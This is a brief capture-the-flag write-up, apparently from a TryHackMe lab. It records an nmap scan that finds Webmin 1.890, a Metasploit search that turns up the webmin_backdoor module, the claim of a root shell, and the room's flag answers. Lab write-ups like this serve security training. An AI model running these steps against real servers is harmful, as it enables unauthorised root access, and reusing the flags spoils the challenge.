```
export IP=10.10.163.185

Nmap
-----------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.890 (Webmin httpd) => can exploit
|_http-favicon: Unknown favicon MD5: 4968C8B62A80A6E04F85C600FE152799
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
-----------------------------------

Exploitation
-----------------------------------
msf6 > search Webmin 1.890

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor (Must set SSL = true)

Running this gave us root shell!!
-----------------------------------

user.txt
============================
THM{SUPPLY_CHAIN_COMPROMISE}
============================

root.txt
============================
THM{UPDATE_YOUR_INSTALL}
============================

```